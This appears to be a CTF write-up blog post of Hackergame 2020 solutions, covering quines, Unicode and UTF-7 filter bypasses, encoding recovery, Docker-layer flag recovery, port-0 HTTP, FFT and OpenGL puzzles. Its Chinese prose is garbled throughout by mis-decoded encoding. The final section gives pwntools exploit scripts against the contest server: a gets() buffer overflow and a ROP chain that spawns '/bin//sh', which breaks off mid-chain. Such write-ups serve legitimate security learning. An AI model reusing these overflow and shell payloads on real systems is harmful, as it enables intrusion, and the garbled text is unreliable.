å¿«é€Ÿè½¬åŒ–ã€Œä¸­æ–‡æ•°å­—ã€å’Œã€Œé˜¿æ‹‰ä¼¯æ•°å­—ã€ï½ (æœ€æ–°ç‰¹æ€§ï¼šåˆ†æ•°ï¼Œæ—¥æœŸã€æ¸©åº¦ç­‰è½¬åŒ–ï¼‰ è‡ªå¤è¯»çš„å¤è¯»æœº ä½ ç°åœ¨éœ€è¦ç¼–å†™ä¸¤ä¸ªåªæœ‰ä¸€è¡Œ Python ä»£ç çš„é¡¶å°–å¤è¯»æœºï¼š å…¶ä¸­ä¸€ä¸ªè¦è¾“å‡ºä»£ç æœ¬èº«çš„é€†åºï¼ˆå³æ‰€æœ‰å­—ç¬¦ä»åå‘å‰ä¾æ¬¡è¾“å‡ºï¼‰ å¦ä¸€ä¸ªæ˜¯è¾“å‡ºä»£ç æœ¬èº«çš„ sha256 å“ˆå¸Œå€¼ï¼Œåå…­è¿›åˆ¶å°å†™ æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶åˆ†åˆ«å¯¹åº”äº†ä¸¤ä¸ª flagã€‚ å‚è€ƒï¼š Wikipedia: Quine (computing) Bä¹ï¼šå¦‚ä½•ç¼–å†™ä¸€ä¸ªæ‰“å°è‡ªèº«æºä»£ç çš„ç¨‹åº åœ¨Pythonä¸­æœ‰ä¸€ä¸ª %rï¼Œå®ƒçš„æ„æ€å°±æ˜¯è°ƒç”¨å¯¹è±¡çš„ repr() æ–¹æ³•åæ›¿æ¢æœ¬èº«åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¯¹äºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¼šä¿ç•™å…¶æœ¬èº«çš„å¼•å·ï¼ˆè¿™ç‚¹åœ¨æˆ‘ä»¬å®ç° Quine çš„æ—¶å€™ä¼šå‡å°‘å¾ˆå¤šéº»çƒ¦ï¼‰ã€‚ è¾“å‡ºä»£ç æœ¬èº«çš„é€†åºs = \"s = %r;print(''.join(reversed(s %% s)),end='')\";print(''.join(reversed(s % s)),end='') BTWï¼Œè¿™ä¸ªé¢˜æœ¬æ¥æƒ³åœ¨ VPS ä¸Šæ­ä¸ªæ¥å£ç›´æ¥è¿”å›çš„é€†å‘çš„å­—ç¬¦ä¸²ï¼Œä¸è¿‡å‘ç°è¿™ä¸ªæœºå™¨å¥½åƒä¸é€šå¤–ç½‘äºæ˜¯ä¸è¡Œï¼Ÿ BTWï¼Œè¿™ä¸ªexec()å¯ä»¥ç›´æ¥è¯»æºç ä½†ä¸èƒ½è¯» flagï¼Œ2333. åŸå› æ˜¯ç”¨äº† subprocess ä»¥ nobody ç”¨æˆ·å»æ‰§è¡Œè„šæœ¬ï¼Œè€Œ flag æ”¾åœ¨äº† /root ç›®å½•ä¸‹ã€‚ è¾“å‡ºä»£ç æœ¬èº«çš„ sha256 å“ˆå¸Œå€¼import hashlib;m=hashlib.sha256();s=\"import hashlib;m=hashlib.sha256();s=%r;m.update((s %% s).encode());print(m.hexdigest(),end='')\";m.update((s % s).encode());print(m.hexdigest(),end='') 233 åŒå­¦çš„å­—ç¬¦ä¸²å·¥å…·é¢˜ç›®æ‰€ç»™å…³é”®ä»£ç å¦‚ä¸‹ã€‚ def to_upper(s): r = re.compile('[fF][lL][aA][gG]') if r.match(s): print('how dare you') elif s.upper() == 'FLAG': print('yes, I will give you the flag') print(open('/flag1').read()) else: print('%s' % s.upper()) def to_utf8(s): r = re.compile('[fF][lL][aA][gG]') s = s.encode() # make it bytes if r.match(s.decode()): print('how dare you') elif s.decode('utf-7') == 'flag': print('yes, I will give you the flag') print(open('/flag2').read()) else: print('%s' % s.decode('utf-7')) å­—ç¬¦ä¸²å¤§å†™å·¥å…·å¾—çœ‹çœ‹å•¥å­—ç¬¦ç»è¿‡ upper æ–¹æ³•å‡ºæ¥å°±æ˜¯ flag æˆ–è€…å…¶ä¸­æŸä¸ªå­—ç¬¦ã€‚ è¿™é‡Œå°±ç¡¬æ˜¯è·‘å‡ºæ¥çš„ã€‚ for i in range(0x80, 0x10000): char = chr(i) if 'f' in char.upper() or 'F' in char.upper(): print(hex(i), chr(i)) print('ï¬‚'.upper()) print(len('ï¬‚')) payload: ï¬‚ag flag{badunic0debadbad_xxxxxxxx} Unicode å¤ªå¥‡å¦™äº†ï¼æ®è¯´è¿™å«åš unicode å­—ç¬¦æŠ˜å /åˆå­—ï¼ˆï¼Ÿï¼‰ Extensive Reading: CSDN: äº†ä¸èµ·çš„ Unicodeï¼ UTF-7 åˆ° UTF-8 è½¬æ¢å·¥å…·s.encode()å’Œ decode() é»˜è®¤ç”¨çš„ utf-8 ç¼–ç ï¼Œè¿™é‡Œç”¨ utf-7 ç¼–ç å†ç”¨ utf-7 è§£ç å°±èƒ½å flag äº†ã€‚ æœ€å¼€å§‹ç”¨ Python çš„ 'flag'.encode('utf-7') æ–¹æ³•ï¼Œå‘ç°å‡ºæ¥ç»“æœå°±æ˜¯ b'flag'ï¼Œå‚»äº†ã€‚ ä¹‹åå»æŸ¥äº† UTF-7 çš„ç»´åŸºç™¾ç§‘ï¼Œå†³å®šè‡ªå·±æŒ‰ç…§ç¼–ç æµç¨‹èµ°ä¸€éå§ã€‚ ï¼ˆæ²¡æ³¨æ„æ˜¯ UTF-16 å¤§ç«¯åºï¼Œæˆ‘è¯•äº†åŠå¤©å‘ç°æœ€åæ˜¯å¤§å°ç«¯çš„é—®é¢˜ï¼Œäººå‚»äº†ã€‚ é¦–å…ˆå°† flag è½¬æ¢ä¸º UTF-16(BE) (1201)ï¼Œå³ä¸‹é¢çš„ xã€‚ è€Œåæ¯å…­ä½ä¸€ç»„è¿›è¡Œ base64 ç¼–ç ï¼Œè¿™é‡Œç›´æ¥ç”¨ base64 æ¨¡å—çš„æ–¹æ³•äº†ã€‚ æœ€åå»æ‰æœ«å°¾çš„ =ï¼Œåœ¨æœ€å‰é¢åŠ ä¸Š +ï¼Œå³å¯å¾—åˆ° UTF-7 ç¼–ç ã€‚ x = b'\\x00\\x66\\x00\\x6c\\x00\\x61\\x00\\x67' y = base64.b64encode(x) # b'AGYAbABhAGc=' b'+AGYAbABhAGc='.decode('utf-7') # 'flag' payload: +AGYAbABhAGc flag{please_visit_www.utf8everywhere.org_25xxxxxx} https://utf8everywhere.org/ å•Š UTF-8 ç¼–ç ç¡®å®æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚ è‰ï¼Œæƒ³æƒ³å°±æ°”ï¼ˆ ä»é›¶å¼€å§‹çš„ç«æ˜Ÿæ–‡ç”Ÿæ´» L åŒå­¦æ‰“å¼€é™„ä»¶ä¸€çœ‹ï¼Œå‚»çœ¼äº†ï¼Œå…¨éƒ½æ˜¯æ„ä¹‰ä¸æ˜çš„æ±‰å­—ã€‚æœºæ™ºçš„ L åŒå­¦æƒ³åˆ° Q åŒå­¦å¹³æ—¶å–œæ¬¢ä½¿ç”¨ GBK ç¼–ç ï¼Œä¹Ÿè®¸æ˜¯æ‰“å¼€æ–¹å¼ä¸å¯¹ã€‚ç»“æœç”¨ GBK æ‰“å¼€å´çœ‹åˆ°äº†ä¸€å †å¤¹æ‚ç€æ—¥è¯­å’Œæ•°å­—çš„ç«æ˜Ÿæ–‡â€¦â€¦ L åŒå­¦å½»åº•æ‡µé€¼äº†ï¼Œå‡ ç»å‘¨æŠ˜ï¼ŒTA æ‰¾åˆ°äº†ç§‘å¤§æœ€è´Ÿç››åçš„ç«æ˜Ÿæ–‡ä¸“å®¶ (ä½ )ã€‚ä¾é å¤šå¹´çš„å­—ç¬¦ç¼–ç è§£ç çš„ç»éªŒï¼Œä½ å¯ä»¥ç ´è¯‘ Q åŒå­¦å‘æ¥çš„ç«æ˜Ÿæ–‡æ˜¯ä»€ä¹ˆæ„æ€å—ï¼Ÿ æ³¨ï¼šæ­£ç¡®çš„ flag å…¨éƒ¨ç”± ASCII å­—ç¬¦ç»„æˆï¼ æœ‰å¤§ä½¬å‘ç°äº†ä¸€ä¸ªç¼–è§£ç ç½‘ç«™ï¼šhttp://www.mytju.com/classcode/tools/messyCodeRecover.asp èƒ½å¤ŸçŒœæµ‹åŸæ¥å’Œå¯èƒ½çš„ç¼–è§£ç æ–¹å¼ã€‚ ï¼ˆBTW, è¿™ä¸ªç½‘ç«™ä¸æ˜¯æœ¬åœ°è·‘çš„ï¼Œè¯·æ³¨æ„ä¿¡æ¯å®‰å…¨ æ ¹æ®æç¤ºï¼Œåº”è¯¥æ˜¯å…ˆç”¨ GBK æ¥è§£ç ï¼ŒGBK =&gt; UTF-8ï¼Œç„¶è€Œç»“æœåƒè¿™æ ·ï¼š å‘ç°ä¸å¯¹åŠ²ï¼Œåº”è¯¥åè¿‡æ¥ï¼Œæ˜¯ UTF-8 =&gt; GBKã€‚ ç„¶åå†æŠŠæ‹¿å»æ¢å¤ã€‚ å‘ç°æ˜¯è¦ç”¨ GBK æ¥è¯»ï¼Œå†è½¬æ¢åˆ° iso-8859-1ï¼Œå³ Latin1ï¼ˆ28591ï¼‰ã€‚ è¦ä¸ç„¶å°± python å†™è„šæœ¬ã€‚ï¼ˆè´¼æƒ³ä¸é€šè¿™é‡Œï¼Œä½›äº† str == encode ==&gt; bytes == decode ==&gt; str with open('gibberish_message.txt', 'rb') as fin: content = fin.read() print(content) content1 = content.decode('utf-8', errors='ignore').encode('gbk') print(content1.decode()) content2 = content1.decode('utf-8', errors='ignore').encode('latin1', errors='ignore') print(content2) content3 = content2.decode('gbk', errors='ignore').encode('utf-8', errors='ignore') print(content3.decode()) å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ Linux ä¸‹å€ŸåŠ© iconv cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8 &gt; 1.txt # OR (utf-8 for default) # cat gibberish_message.txt | iconv -t gbk | iconv -t latin1 | iconv -f gbk å¾—åˆ°æ–‡ä»¶å†…å®¹ æˆ‘æ”»ç ´äº† ï¼¨ï½ï½ƒï½‹ï½…ï½’ï½‡ï½ï½ï½… çš„æœåŠ¡å™¨ï¼Œå·åˆ°äº†å®ƒä»¬çš„ ï½†ï½Œï½ï½‡ï¼Œç°åœ¨æˆ‘æŠŠ ï½†ï½Œï½ï½‡ å‘ç»™ä½ ï¼š ï½†ï½Œï½ï½‡ï½›ï¼¨ï¼”ï½–ï¼“ï¼¿ï¼¦ï½•ï¼®ï¼¿ï½—ï¼‘ï¼´ï½ˆï¼¿ï¼“ï½ï½ƒï¼ï½„ï¼‘ï½ï½‡ï¼¿ï¼”ï¼®ï½„ï¼¿ï½„ï¼“ï½ƒï¼ï¼¤ï¼‘ï½ï¼§ï¼¿xxxxxxï½ å¿«å»æ¯”èµ›å¹³å°æäº¤å§ï¼ ä¸è¦å†æŠŠè¿™ä»½ä¿¡æ¯è½¬å‘ç»™å…¶ä»–äººäº†ï¼Œè¦æ˜¯è¢«å‘ç°å°±ç³Ÿç³•äº†ï¼ flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_xxxxxx} è¶…ç®€å•çš„ä¸–ç•Œæ¨¡æ‹Ÿå™¨å‚è€ƒï¼š wikipedia: Conwayâ€™s Game of Life å­¦æœ¯å¹²è´§ | Conwayâ€™s Game of Life ç”Ÿå‘½æ¸¸æˆçš„å»ºç­‘è®¾è®¡åº”ç”¨ è¿™é‡Œæœ‰ä¸ªæ¨¡æ‹Ÿå™¨ï¼šhttps://nealwang.net/JustForFun/GameOfLife.html ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚ ä¸¤ä¸ªæ­£æ–¹å½¢çš„ç¬¬ä¸€è¡Œåˆ†åˆ«ä½äºç¬¬6è¡Œï¼Œç¬¬26è¡Œã€‚ è´è¶æ•ˆåº”æ¶ˆé™¤ç¬¬ä¸€ä¸ªæ­£æ–¹å½¢ï¼š ä¸‹é¢ LWSS è¿™ä¸ªå›¾å½¢èƒ½æ°´å¹³å‘å³ç§»åŠ¨ã€‚ è€Œ Glinder è¿™ä¸ªå›¾å½¢èƒ½å‘å³ä¸‹è§’45Â°æ–¹å‘ç§»åŠ¨ã€‚ 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 # Or 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 æµ‹è¯•ä¸­å‘ç°è¿™äº›èƒ½æ¸…é™¤ä¸‹é¢çš„æ­£æ–¹å½¢ï¼ˆï¼ˆ 000000000000000 000000000000000 000000000000000 000000000010000 000000000001000 100100000111000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 # OR 000000000000000 000000000000100 000000000000010 000000000001110 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 ä¸€çŸ³äºŒé¸Ÿéœ€è¦åŒæ—¶æ¶ˆé™¤ä¸¤ä¸ªæ­£æ–¹å½¢ã€‚ è¯•äº†å¥½ä¹…æ²¡å‡ºæ¥ï¼Œæœ€åè¿˜æ˜¯çæ”¹å‡ºæ¥çš„233ã€‚ å‘ç°ä¸‹é¢è¿™ä¸ªå›¾å½¢èƒ½å‘å¤–æ‰©æ•£ï¼Œäºæ˜¯è¯•è¯•ã€‚ 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000010010 000000000000001 000000000010001 000000000001111 000000000000000 000000000000000 001100000000000 000100000000000 011100000000000 000000000000000 233 åŒå­¦çš„ Docker 233 åŒå­¦åœ¨è½¯å·¥è¯¾ä¸Šå­¦åˆ°äº† Docker è¿™ç§æ–¹ä¾¿çš„ä¸œè¥¿ï¼Œäºæ˜¯ç»™è‡ªå·±çš„å­—ç¬¦ä¸²å·¥å…·é¡¹ç›®å†™äº†ä¸€ä¸ª Dockerfileã€‚ ä½†æ˜¯ 233 åŒå­¦çªç„¶å‘ç°å®ƒä¸å°å¿ƒæŠŠä¸€ä¸ªç§å¯†æ–‡ä»¶ï¼ˆflag.txtï¼‰æ‰“åŒ…è¿›å»äº†ï¼Œäºæ˜¯å†™äº†ä¸€è¡Œå‘½ä»¤åˆ æ‰è¿™ä¸ªæ–‡ä»¶ã€‚ ã€Œæ—¢ç„¶å·²ç»åˆ æ‰äº†ï¼Œåº”è¯¥ä¸ä¼šè¢«äººæ‰¾å‡ºæ¥å§ï¼Ÿã€233 æƒ³é“ã€‚ Docker Hub åœ°å€ï¼š8b8d3c8324c7/stringtool é¦–å…ˆæŠŠé•œåƒæ‹‰ä¸‹æ¥ docker pull 8b8d3c8324c7/stringtool åœ¨ Image Layers é‡Œå¯ä»¥çœ‹åˆ°åˆ é™¤ flag.txt çš„å±‚ã€‚ æˆ–è€… docker history 8b8d3c8324c7/stringtool é‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾ä¸€æ‰¾æ„å»ºè¿‡ç¨‹ä¸­çš„æ–‡ä»¶å¥½äº†ã€‚ æŠŠé•œåƒå¯¼å‡ºæ¥ã€‚ docker save 8b8d3c8324c7/stringtool &gt; images.tar BTW, docker save ç”¨æ¥å°†ä¸€ä¸ªæˆ–å¤šä¸ª image æ‰“åŒ…ä¿å­˜ï¼Œè€Œ docker export ç”¨æ¥å°† container çš„æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ‰“åŒ…ã€‚ docker load ç”¨æ¥è½½å…¥é•œåƒåŒ…ï¼Œdocker import ç”¨æ¥è½½å…¥å®¹å™¨åŒ…ï¼Œä½†ä¸¤è€…éƒ½ä¼šæ¢å¤ä¸ºé•œåƒï¼› docker load ä¸èƒ½å¯¹è½½å…¥çš„é•œåƒé‡å‘½åï¼Œè€Œ docker import å¯ä»¥ä¸ºé•œåƒæŒ‡å®šæ–°åç§°ã€‚ ï¼ˆå‚è€ƒ docker saveä¸docker exportçš„åŒºåˆ«ï¼‰ åœ¨é‡Œé¢æ‰¾åˆ°äº†ã€‚ï¼ˆè¯è¯´æœ‰æ²¡æœ‰å¿«ä¸€ç‚¹çš„æ–¹æ³•å”‰ flag{Docker_Layers!=PS_Layers_hhh} é¡ºä¾¿çœ‹äº†ä¸€çœ¼ Dockerfileã€‚ # Set the base image to use to centos 7 FROM centos:7 # Set the file maintainer MAINTAINER Software_Engineering_Project # Install necessary tools RUN yum -y install wget make yum-utils # Install python dependencies RUN yum-builddep python -y # Install tools needed RUN yum -y install gcc RUN yum -y install vim RUN yum -y install mariadb-devel # Download the python3.7.3 RUN wget -O /tmp/Python-3.7.3.tgz https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz # Build and install python3.7.3 RUN tar -zxvf /tmp/Python-3.7.3.tgz -C /tmp/ RUN /tmp/Python-3.7.3/configure RUN make &amp;&amp; make install # Create symbolic link RUN rm -f /usr/bin/python RUN ln -s /usr/local/bin/python3 /usr/bin/python RUN ln -s /usr/local/bin/pip3 /usr/bin/pip # Upgrade the pip RUN pip install --upgrade pip # Fix the yum RUN sed -i 's/python/python2/' /usr/bin/yum # Clean RUN rm -rf /tmp/Python-3.7.3* RUN yum clean all RUN pip3 install ipython RUN pip3 install bpython RUN pip3 install pipenv ENV PYTHONUNBUFFERED 1 RUN mkdir /code WORKDIR /code COPY . /code/ RUN rm /code/flag.txt ENTRYPOINT python /code/app.py æ¯ä¸€æ¬¡ RUN éƒ½æ˜¯æ–°å¼€ä¸€ä¸ªå®¹å™¨æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œåœ¨å½“å‰é•œåƒåŸºç¡€ä¸Šæ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œå¹¶æäº¤ä¸ºæ–°çš„é•œåƒã€‚ æŸç§ç¨‹åº¦ä¸Šå¯ä»¥è¯´é•œåƒæ˜¯ä¸€ä¸ªåˆ†å±‚çš„æ–‡ä»¶ç³»ç»Ÿã€‚Docker é•œåƒå®é™…ä¸Šå°±æ˜¯ç”±è¿™æ ·çš„ä¸€å±‚å±‚æ–‡ä»¶è¿›è¡Œå åŠ èµ·æ¥çš„ï¼Œä¸Šå±‚çš„æ–‡ä»¶ä¼šè¦†ç›–ä¸‹å±‚çš„åŒåæ–‡ä»¶ã€‚è€Œå„å±‚é‡Œæœ‰é‡å¤çš„æ–‡ä»¶ï¼Œå› æ­¤é•œåƒè¦å¤§å¾—å¤šã€‚è¿™äº›å±‚åˆå¹¶åœ¨ä¸€èµ·å°±æˆäº†å®¹å™¨é‡Œçš„å†…å®¹ã€‚ ä¹Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œflag ä¹Ÿèƒ½å¤Ÿè¢«æ‰¾åˆ°äº†23333. ä»é›¶å¼€å§‹çš„ HTTP é“¾æ¥ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ•°ç»„ä¸‹æ ‡åº”å½“ä» 0 å¼€å§‹ã€‚ åŒæ ·çš„ï¼ŒTCP ç«¯å£ä¹Ÿåº”å½“ä» 0 å¼€å§‹ã€‚ä¸ºäº†å®è·µè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æŠŠä¸€ä¸ªç½‘ç«™æ¶è®¾åœ¨æœåŠ¡å™¨çš„ 0 å·ç«¯å£ä¸Šã€‚ ä½ èƒ½æˆåŠŸè¿æ¥åˆ° 0 å·ç«¯å£å¹¶æ‹¿åˆ° flag å—ï¼Ÿ ç‚¹å‡»ä¸‹é¢çš„æ‰“å¼€é¢˜ç›®æŒ‰é’®æ˜¯æ— æ³•æ‰“å¼€ç½‘é¡µçš„ï¼Œå› ä¸ºæ™®é€šçš„æµè§ˆå™¨ä¼šè®¤ä¸ºè¿™æ˜¯æ— æ•ˆåœ°å€ã€‚ http://202.38.93.111:0/ è¿™ä¸ªçœŸçš„æœ‰æ„æ€ã€‚ä¸€èˆ¬ TCP ç«¯å£éƒ½æ˜¯1-65535ï¼Œäºæ˜¯å¾ˆå¤šå®¢æˆ·ç«¯éƒ½ä¸æ”¯æŒ 0 å·ç«¯å£ã€‚ å¥½åœ¨éƒ¨åˆ†ç‰ˆæœ¬çš„ curl ä»¥åŠ wget æ”¯æŒã€‚ ç„¶è€Œæˆ‘åœ¨æœ¬åœ°è·‘è¿˜è¿ä¸ä¸Šè¿™ä¸ªç«¯å£ï¼Œæ€•æ˜¯è¢«è¿è¥å•†ææ–­äº†ï¼Ÿ åœ¨VPSä¸Šè¯•è¯•ï¼Œå‘ç°å¯è¡Œã€‚ curl http://202.38.93.111:0 # æˆ–è€… # wget http://202.38.93.111:0 å¾—åˆ°ä¸€ä¸ªç½‘é¡µï¼Œå‘ç°æ˜¯ä¸€ä¸ª xterm ç»ˆç«¯ï¼Œå’Œå…¶ä»–é¢˜ç›®çš„åœ¨çº¿ç»ˆç«¯ä¸€æ ·çš„ã€‚ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;Terminal&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"/js/xterm/css/xterm.css\" /&gt; &lt;script src=\"/js/xterm/lib/xterm.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/xterm-addon-attach/lib/xterm-addon-attach.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/xterm-addon-fit/lib/xterm-addon-fit.js\"&gt;&lt;/script&gt; &lt;style&gt; #terminal { position: absolute; top: 0; right: 0; bottom: 0; left: 0; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"terminal\"&gt;&lt;/div&gt; &lt;script&gt; const term = new Terminal(); const fitAddon = new FitAddon.FitAddon(); term.loadAddon(fitAddon); term.open(document.getElementById(\"terminal\")); fitAddon.fit(); window.addEventListener('resize', function(event) { fitAddon.fit(); }); var firstmsg = true; const socket = new WebSocket( location.origin.replace(/^http/, \"ws\") + \"/shell\" ); const attachAddon = new AttachAddon.AttachAddon(socket); term.loadAddon(attachAddon); socket.onclose = event =&gt; { term.write(\"\\nConnection closed\"); }; socket.onmessage = event =&gt; { if (firstmsg) { firstmsg = false; let token = new URLSearchParams(window.location.search).get(\"token\"); window.history.replaceState({}, null, '/'); if (token) { localStorage.setItem('token', token); } else { token = localStorage.getItem('token'); } if (token) socket.send(token + \"\\n\"); } }; term.focus(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; è¿™ä¸ªé€»è¾‘æ˜¯è®¿é—®ç½‘é¡µåå®ä¾‹åŒ–ä¸€ä¸ª WebSocketï¼Œå°† HTTP å‡çº§åˆ° WS åè®®ï¼ŒURI ä¸º ws://202.38.93.111:0/shell äºæ˜¯ä¹å°±å»æ‰¾ websocket å®¢æˆ·ç«¯æ¥å®ç°ã€‚ æœ€å¼€å§‹æƒ³ç”¨ pwntoolsï¼Œå‘ç°èƒ½ä½œä¸º socket è¿ä¸Šä½†è¿˜æ¨¡ä»¿ä¸äº† wsï¼ˆå¯èƒ½æ²¡é¢†æ‚Ÿåˆ°ã€‚ ä¹‹åæ‰¾åˆ°äº† GitHub ä¸Šçš„ **websocket-client**ï¼Œè¿™æ˜¯ä¸€ä¸ª Python çš„ ws åº“ï¼Œæœ¬æ¥æƒ³ç›´æ¥ç”¨ä»–ç°æˆçš„ wsdump.pyï¼Œå‘ç°è¿ä¸ä¸Šã€‚ã€‚ æœ€ååˆæ‰¾äº†ä¸ªç¼–è¯‘å¥½çš„å®¢æˆ·ç«¯ï¼Œ**websocat**ï¼ŒæŒ‰ç…§å®‰è£…è¯´æ˜è¿›è¡Œå®‰è£…ï¼Œå†è¿æ¥æœåŠ¡å™¨å°±å®Œäº‹äº†ã€‚ æ¥è‡ªä¸€æ•™çš„å›¾ç‰‡ å° P åœ¨ä¸€æ•™åšå‚…é‡Œå¶å…‰å­¦å®éªŒæ—¶ï¼Œåœ¨å®éªŒå®¤ç”µè„‘çš„æ¨¡æ‹Ÿç¨‹åºé‡Œå‘ç°äº†è¿™ä¹ˆä¸€å¼ çš„å›¾ç‰‡ï¼š æ•°ç†åŸºç¡€å¹¶ä¸æ‰å®çš„å° P å¹¶ä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿æˆåƒä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼šåˆæˆ–è®¸ä»€ä¹ˆä¸œè¥¿éƒ½ä¸æ˜¯ï¼Œæ¯•ç«Ÿè¿™åªæ˜¯æ¨¡æ‹Ÿ â€¦ ä½†å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œè¿™äº›çœ‹ä¼¼å¥‡æ€ªçš„èŠ±çº¹é‡Œç¡®å®éšè—ç€ä¸€äº›ä¿¡æ¯ï¼Œæˆ–è®¸æ˜¯åœ°ä¸‹é‡‘çŸ¿çš„è—å®å›¾ä¹Ÿæœªå¯çŸ¥ã€‚ æ ¹æ®æç¤ºåº”è¯¥ä¸ å‚…é‡Œå¶å˜æ¢ æœ‰å…³ã€‚ ç»™å›¾ç‰‡åšä¸ª FFT å¤„ç†ï¼Œå°±å¾—åˆ° flag äº†ã€‚ æ‹¼ä¸€ä¸‹å°±èƒ½å¾—åˆ° flag{Fxurier_xptics_is_fun} å™¢ Fourier optics çš„ç¡®æ˜¯å‚…é‡Œå¶å…‰å­¦ï¼Œå˜»å˜»å˜»ã€‚ è¶…ç®€é™‹çš„ OpenGL å°ç¨‹åºå•¥ä¹Ÿä¸æ‡‚ï¼Œé­”æ”¹å°±æ˜¯äº†ã€‚ æŠŠæ–‡ä»¶åˆ äº†ç‚¹ä¸œè¥¿ï¼Œä»–å‡ºæ¥è¿™æ ·çš„ã€‚ ä¸å¯¹åŠ²ï¼ŒæŸ¥äº†ä¸€ä¸‹è¿™ä¸ªå¥½åƒæ˜¯ OpenGLç€è‰²å™¨è¯­è¨€(GLSL)ã€‚ æœ‰æœºä¼šå¯ä»¥çœ‹çœ‹ OpenGL å…¥é—¨æ–‡æ¡£ã€‚ æœ€åé­”æ”¹äº† basic_lighting.vs è¿™ä¸ªæ–‡ä»¶ã€‚çœ‹ä¸æ¸…æ¥šå°±æ”¹æ”¹åç§»å°±å¥½äº†ã€‚ void main() { FragPos = vec3(projection * vec4(aPos-0.45, 1.0)); Normal = aNormal; gl_Position = projection * view * vec4(FragPos, 1.0); } flag{glGraphicsHappy(233);} ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Šå§‹ç»ˆçƒ­çˆ±å¤§åœ°æ˜¯ä¸ªæœ€åŸºæœ¬çš„æ ˆæº¢å‡ºã€‚ gets(input);å‡½æ•°å­˜åœ¨æ¼æ´ï¼Œçœ‹ä¸€ä¸‹æ ˆä¸Šæƒ…å†µã€‚ input å¯¹åº” v14ï¼Œsuccess å¯¹åº” v17 åç§»ä¸º -0x01-(-0x90) = 0x8F bool åº“é‡Œçš„ true ä¸º 0x01ã€‚ æŠŠè¿™ä¸ª success è¦†ç›–ä¸º 0x01 å°±èƒ½å‡º flag äº†ã€‚ #!/usr/bin/python3 # coding: utf-8 \"\"\" Hackergame_tictactoe @Author: MiaoTony @Time: 20201103 \"\"\" from pwn import * context.log_level = 'debug' token = 'xxxxxxxxxxxxxxxxxxx' sh = remote(\"202.38.93.111\", 10141) sh.sendlineafter('Please input your token: ', token) payload = b'1' * 0x8F payload += b'\\x01' sh.sendlineafter('such as (0,1): ', payload) sh.interactive() flag{easy_gamE_but_can_u_get_my_shel1} å‡ä¸Šå¤©ç©ºè¦æ‹¿ shell å•Šã€‚ã€‚ å…ˆç”¨ ROPgadget ç”Ÿæˆ ROP Chain. ROPgadget --binary tictactoe --ropchain ç„¶åæŠŠè¿™ä¸ªæ”¾åˆ°è¿”å›å€¼çš„ä½ç½®æ‰“è¿‡å»å°±å®Œäº‹äº†ã€‚ #!/usr/bin/python3 # coding: utf-8 from struct import pack from pwn import context, remote context.log_level = 'debug' token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' sh = remote(\"202.38.93.111\", 10141) sh.sendlineafter('Please input your token: ', token) payload = b'1' * 0x8F payload += b'\\x01' payload += b'1' * 8 # Padding goes here p = b'' p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e0) # @ .data p += pack('&lt;Q', 0x000000000043e52c) # pop rax ; ret p += b'/bin//sh' p += pack('&lt;Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x0000000000439070) # xor rax, rax ; ret p += pack('&lt;Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x00000000004017b6) # pop rdi ; ret p += pack('&lt;Q', 0x00000000004a60e0) # @ .data p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x000000000043dbb5) # pop rdx ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x0000000000439070) # xor rax, rax ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add 